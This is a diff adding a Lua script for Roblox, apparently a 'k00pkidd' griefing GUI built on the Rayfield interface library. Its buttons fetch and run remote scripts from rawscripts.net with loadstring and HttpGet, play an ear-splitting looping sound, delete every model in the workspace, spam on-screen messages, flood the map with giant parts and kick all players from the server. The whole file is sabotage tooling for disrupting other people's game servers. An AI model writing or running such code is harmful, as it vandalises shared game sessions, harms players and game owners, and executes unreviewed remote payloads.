@@ -1,0 +1,214 @@
+local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+local Window = Rayfield:CreateWindow({
+   Name = "k00pkidd Gui",
+   Icon = 0, -- Icon in Topbar. Can use Lucide Icons (string) or Roblox Image (number). 0 to use no icon (default).
+   LoadingTitle = "k00pgui Interface Suite",
+   LoadingSubtitle = "by k00pkidd",
+   ShowText = "Rayfield", -- for mobile users to unhide rayfield, change if you'd like
+   Theme = "Default", -- Check https://docs.sirius.menu/rayfield/configuration/themes
+
+
+   ToggleUIKeybind = "K", -- The keybind to toggle the UI visibility (string like "K" or Enum.KeyCode)
+
+
+   DisableRayfieldPrompts = false,
+   DisableBuildWarnings = false, -- Prevents Rayfield from warning when the script has a version mismatch with the interface
+
+
+   ConfigurationSaving = {
+      Enabled = true,
+      FolderName = nil, -- Create a custom folder for your hub/game
+      FileName = "Big Hub"
+   },
+
+
+   Discord = {
+      Enabled = false, -- Prompt the user to join your Discord server if their executor supports it
+      Invite = "noinvitelink", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ ABCD would be ABCD
+      RememberJoins = true -- Set this to false to make them join the discord every time they load it up
+   },
+
+
+   KeySystem = false, -- Set this to true to use our key system
+   KeySettings = {
+      Title = "Untitled",
+      Subtitle = "Key System",
+      Note = "No method of obtaining the key is provided", -- Use this to tell the user how to get a key
+      FileName = "Key", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
+      SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
+      GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
+      Key = {"Hello"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
+   }
+})
+local Tab = Window:CreateTab("Main", 4483362458) -- Title, Image
+local Button = Tab:CreateButton({
+   Name = "Decal Spam",
+   Callback = function()
+   loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-K00pkidd-decal-spam-43507"))()
+   end,
+})
+local Button = Tab:CreateButton({
+   Name = "Music Theme",
+   Callback = function()
+   local sound = Instance.new("Sound",game.Workspace)
+  sound.Name = "H4xed By not4player214"
+  sound.SoundId = "rbxassetid://1839246711"
+  sound.Volume = 999999999999999999999
+  sound.PlaybackSpeed = 0.9
+  sound.Looped = true
+  sound:Play()
+   end,
+})
+
+
+local Button = Tab:CreateButton({
+   Name = "Skybox",
+   Callback = function()
+   loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-k00pkidd-skybox-43507"))()
+   end,
+})
+local Button = Tab:CreateButton({
+   Name = "Particle",
+   Callback = function()
+   loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-k00pkidd-particle-43507"))()
+   end,
+})
+local Button = Tab:CreateButton({
+   Name = "Hint",
+   Callback = function()
+   loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-K00pkidd-hint-43505"))()
+   end,
+})
+local Button = Tab:CreateButton({
+   Name = "Jumpscare",
+   Callback = function()
+   loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-K00pkidd-jumpscare-43507"))()
+   end,
+})
+local Button = Tab:CreateButton({
+   Name = "Disco",
+   Callback = function()
+   local Lighting = game:GetService("Lighting")
+local ColorCorrection = Instance.new("ColorCorrectionEffect", Lighting)
+
+function zigzag(X) 
+return math.acos(math.cos(X*math.pi))/math.pi
+end
+
+Counter = 0
+
+Lighting.TimeOfDay = "12:00"
+
+while wait(0.1) do 
+ColorCorrection.TintColor = Color3.fromHSV(zigzag(Counter),1,1)
+Lighting.Ambient = Color3.fromHSV(zigzag(Counter),1,1)
+Counter += 0.01
+end
+   end,
+})
+local Button = Tab:CreateButton({
+   Name = "Raining Toads",
+   Callback = function()
+   
+		wait(1)
+		math.randomseed(tick() % 1 * 1e6)
+		sky = coroutine.create(function()
+			while wait(0.3) do
+				s = Instance.new("Sky",game.Lighting)
+				s.SkyboxBk,s.SkyboxDn,s.SkyboxFt,s.SkyboxLf,s.SkyboxRt,s.SkyboxUp = "rbxassetid://18969597557","rbxassetid://18969597557","rbxassetid://201208408","rbxassetid://18969597557","rbxassetid://18969597557","rbxassetid://18969597557"
+				s.CelestialBodiesShown = true
+			end
+		end)
+
+
+		local m = Instance.new("Hint", game.workspace)
+		m.Text = " 	k00pkidd2 join today!"
+
+		del = coroutine.create(function()
+			while wait(0.3) do
+				for i,v in pairs(workspace:GetChildren()) do
+					if v:IsA("Model") then
+						v:Destroy()
+					end
+				end
+			end
+		end)
+
+
+
+		for i,v in pairs(game.Players:GetChildren()) do
+			v.Character.Archivable = true
+		end
+
+		noises = {'rbxassetid://230287740','rbxassetid://271787597','rbxassetid://153752123','rbxassetid://271787503'}
+
+		sound = coroutine.create(function()
+			a = Instance.new("Sound",workspace)
+			a.SoundId = "rbxassetid://"
+			a.Name = "RAINING MEN"
+			a.Volume = 58359
+			a.Looped = true
+			a:Play()
+			while wait(0.2) do
+				rainin = workspace:FindFirstChild("souhi14 lol")
+				if not rainin then
+					a = Instance.new("Sound",workspace)
+					a.SoundId = "rbxassetid://"
+					a.Name = "RAINING MEN"
+					a.Volume = 58359
+					a.Looped = true
+					a:Play()
+				end
+			end
+		end)
+
+		msg = coroutine.create(function()
+			while wait(0.4) do
+				msg = Instance.new("Message",workspace)
+				msg.Text = "k00gui v1 by k00pkidd"
+				wait(0.4)
+				msg:Destroy()
+			end
+		end) 
+
+
+		rain = coroutine.create(function()
+			while wait(10 % 1 * 1e2) do
+				part = Instance.new("Part",workspace)
+				part.Name = "Toad"
+
+				mesh = Instance.new("SpecialMesh",part)
+
+				sound = Instance.new("Sound",workspace)
+
+				part.CanCollide = false
+				part.Size = Vector3.new(440,530,380)
+				part.Position = Vector3.new(math.random(-3000,1000),math.random(1,3000),math.random(-3000,3000))
+
+				sound.SoundId = noises[math.random(1,#noises)]
+				sound:Play()
+				sound.Ended:connect(function()
+					sound:Destroy()
+				end)
+
+
+				mesh.MeshType = "FileMesh"
+				mesh.MeshId = "rbxassetid://94985586062793"
+				mesh.TextureId = "rbxassetid://94985586062793"
+			end
+		end)
+		coroutine.resume(sky)
+		coroutine.resume(del)
+		coroutine.resume(sound)
+		coroutine.resume(msg)
+		coroutine.resume(rain)
+   end,
+})
+local Button = Tab:CreateButton({
+   Name = "Shutdown",
+   Callback = function()
+   for i, players in pairs(game.Players:GetChildren()) do
+			players:Kick("The Game Iz Fuked Up!!!111")
+		end
+   end,
+})
